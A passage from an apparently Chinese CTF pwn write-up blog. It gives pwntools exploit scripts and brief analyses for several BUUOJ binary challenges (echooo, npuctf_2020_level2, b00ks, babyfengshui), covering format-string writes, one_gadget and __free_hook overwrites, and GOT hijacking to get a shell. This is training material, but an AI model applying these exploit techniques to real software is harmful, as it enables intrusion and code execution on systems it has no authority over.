class="line">libc_base_addr = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">LOG_ADDR(<span class="string">&quot;libc_base_addr&quot;</span>, libc_base_addr)</span><br><span class="line"></span><br><span class="line">one_gadget1 = libc_base_addr + <span class="number">0x10a387</span></span><br><span class="line">__rtld_lock_unlock_recursive_offset = <span class="number">0x81df60</span></span><br><span class="line">target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget1 = libc_base_addr + 0xe569f</span></span><br><span class="line"><span class="comment"># _dl_catch_error_offset = 0x5f4038</span></span><br><span class="line"><span class="comment"># target_addr = libc_base_addr + _dl_catch_error_offset</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, <span class="built_in">str</span>(target_addr))</span><br><span class="line">input_gadget = one_gadget1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(input_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    input_gadget = input_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章-2"><a class="markdownIt-Anchor" href="#参考文章-2">#</a> 参考文章</h2><p><a href="http://kuanghy.github.io/2016/10/26/python-functools">Python 中的 functools</a></p><h1 id="picoctf_2018_echooo32位格式化字符串"><a class="markdownIt-Anchor" href="#picoctf_2018_echooo32位格式化字符串">#</a> picoctf_2018_echooo (32 位格式化字符串)</h1><h2 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./PicoCTF_2018_echooo&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28387</span>)</span><br><span class="line">offset=<span class="number">11</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>,<span class="number">27</span>+<span class="number">11</span>):</span><br><span class="line">    payload=<span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">    aim=unhex(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    flag+=aim[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="npuctf_2020_level2args上的格式化字符串漏洞"><a class="markdownIt-Anchor" href="#npuctf_2020_level2args上的格式化字符串漏洞">#</a> npuctf_2020_level2 (args 上的格式化字符串漏洞)</h1><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202021650076.png" alt="image-20220202165015889"></p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202021659073.png" alt="image-20220202165914998"></p><p>漏洞点为 printf 格式化字符串部分，但 buf 在 bss 段不在栈上因而不能通过填地址来写入，需要借助地址链分批次写入</p><h2 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">LOG_ADDR = <span class="keyword">lambda</span> x, y: log.success(<span class="string">&#x27;&#123;&#125; ===&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, <span class="built_in">hex</span>(y)))</span><br><span class="line">int16 = functools.partial(<span class="built_in">int</span>, base=<span class="number">16</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./npuctf_2020_level2&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;%9$p,%24$p&quot;</span>)</span><br><span class="line">msg = sh.recvline()</span><br><span class="line">stack_addr, libc_addr = msg[:-<span class="number">1</span>].split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int16(stack_addr.decode())</span><br><span class="line">libc_addr = int16(libc_addr.decode())</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;libc_addr&#x27;</span>, libc_addr)</span><br><span class="line"></span><br><span class="line">stack_ret_addr = stack_addr - <span class="number">0xe0</span></span><br><span class="line">libc_base_addr = libc_addr - <span class="number">0x3e7638</span></span><br><span class="line"></span><br><span class="line">LOG_ADDR(<span class="string">&#x27;stack_ret_addr&#x27;</span>, stack_ret_addr)</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;libc_base_addr&#x27;</span>, libc_base_addr)</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base_addr + gadgets[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">LOG_ADDR(<span class="string">&#x27;one_gadget&#x27;</span>, one_gadget)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>((stack_ret_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%35$hn&quot;</span>.<span class="built_in">format</span>((one_gadget &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%9$hhn&quot;</span>.<span class="built_in">format</span>((stack_ret_addr &amp; <span class="number">0xff</span>) + <span class="number">2</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%35$hhn&quot;</span>.<span class="built_in">format</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;6&quot;</span> * <span class="number">8</span> + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#9  35</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./npuctf_2020_level2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload1=<span class="string">&#x27;%7$p#%9$p@&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=(<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;#&quot;</span>,<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">231</span>)-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">addr_stack=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;@&quot;</span>,<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">one_gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget=one_gadgets[<span class="number">1</span>]+libc_base</span><br><span class="line">stackbase = addr_stack &amp; <span class="number">0xffff</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stackbase) + <span class="string">&#x27;c%9$hn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%35$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stackbase+<span class="number">1</span>)+<span class="string">&#x27;c%9$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%35$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stackbase+<span class="number">2</span>)+<span class="string">&#x27;c%9$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%35$hhn\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recv(&#x27;\x20\x20\xb4&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;66666666\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="asis2016_b00ksoff-by-null"><a class="markdownIt-Anchor" href="#asis2016_b00ksoff-by-null">#</a> asis2016_b00ks(off-by-null)</h1><h2 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28085</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./asis2016_b00ks&quot;)</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(r, </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    b *$rebase(0x1245)</span></span><br><span class="line"><span class="string">    x/20gx $rebase(0x202040)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget_16 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt; &quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1, content1, size2, content2</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book name size: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>)</span><br><span class="line">    r.send(content1)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book description size: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size2))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book description: &quot;</span>)</span><br><span class="line">    r.send(content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter new book description: &quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_name</span>(<span class="params">name</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">&#x27;aa\n&#x27;</span>, <span class="number">0x90</span>, <span class="string">&#x27;aa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x21000</span>, <span class="string">&#x27;aa\n&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;aa\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x160</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(heap+<span class="number">0x198</span>)*<span class="number">2</span> + p64(<span class="number">0xffff</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line"><span class="comment">#offset = 0x7fc715ef1010 - 0x7fc71593e000</span></span><br><span class="line">offset = <span class="number">0x7f4875e6a010</span> - <span class="number">0x7f48758a4000</span></span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(bin_sh) + p64(free_hook) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(system)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="babyfengshui_33c3_2016"><a class="markdownIt-Anchor" href="#babyfengshui_33c3_2016">#</a> babyfengshui_33c3_2016</h1><h2 id="程序分析-2"><a class="markdownIt-Anchor" href="#程序分析-2">#</a> 程序分析</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202072305811.png" alt="image-20220207230521669"></p><p>checksec 后可以看到 relro 保护没开，可以劫持函数 got 表</p><p>由于是 <code>*（&amp;ptr+a1）-4</code>  是靠偏移来确定大小的，所以也就只有在 name 堆块与 text 堆块在物理地址相邻时才有作用，因此我们可以通过 delete 函数删除一个 user 便可以使程序连续 free 掉两个堆块，从而使两个 0x88 的堆块合并成为一个 <code>0x110</code>  的堆块</p><p>进而我们再次使用 add 添加数据的时候，第一次输入的 name 设置大小为 0x100 就可以使 name 与 text 堆块物理不相邻，这样一来我们的 text 字段便可输入任意大小的数据</p><p>接下来就可以对能够造成溢出的 name 堆块填充大量的数据覆盖到下一个 user 的 name 字段中，来控制下一个 user 中的 text 地址指向</p><p>最后便可以控制该 text 指向某个函数的 got 表地址，即可劫持函数的 got 表指向 system 函数。</p><h2 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;node4.buuoj.cn&quot;,26147)</span></span><br><span class="line">p=process(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,length,text</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size of description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text length:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text:&quot;</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index,length,text</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span 